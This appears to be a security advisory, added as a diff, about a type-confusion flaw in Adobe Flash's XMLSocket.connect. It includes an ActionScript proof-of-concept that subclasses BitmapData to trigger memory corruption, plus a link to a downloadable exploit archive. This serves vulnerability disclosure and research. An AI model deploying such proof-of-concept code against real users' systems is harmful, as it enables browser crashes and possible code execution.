@@ -1,0 +1,40 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=416&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+This issue is a variant of  issue 192 , which the fix did not address.
+
+If XMLSocket connect is called on an object that already has a destroy function set, such as a BitmapData object, the method will set the user data of that object, but not clear the destroy function. This leads to type confusion when the user data is freed during garbage collection.
+
+A PoC is as follows:
+
+class subsocket extends flash.display.BitmapData{
+	
+
+	public function subsocket(){
+			
+	var n = {valueOf : func};
+    this.valueOf = func;
+	var x = new XMLSocket();
+
+	x.connect.call(this, "127.0.0.1", this);
+
+}
+
+function func(){
+
+	if(this){
+		}
+	this.__proto__ = {}; 
+	this.__proto__.__constructor__ = flash.display.BitmapData;
+	super(10, 10, true, 10);
+	return 80;
+	}
+		
+		
+}
+	
+
+A SWF and fla are attached. Note that this PoC needs to be run on a webserver on localhost (or change the IP in the PoC to the server value), and it only crashes in Chrome on 64-bit Linux.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37876.zip
+
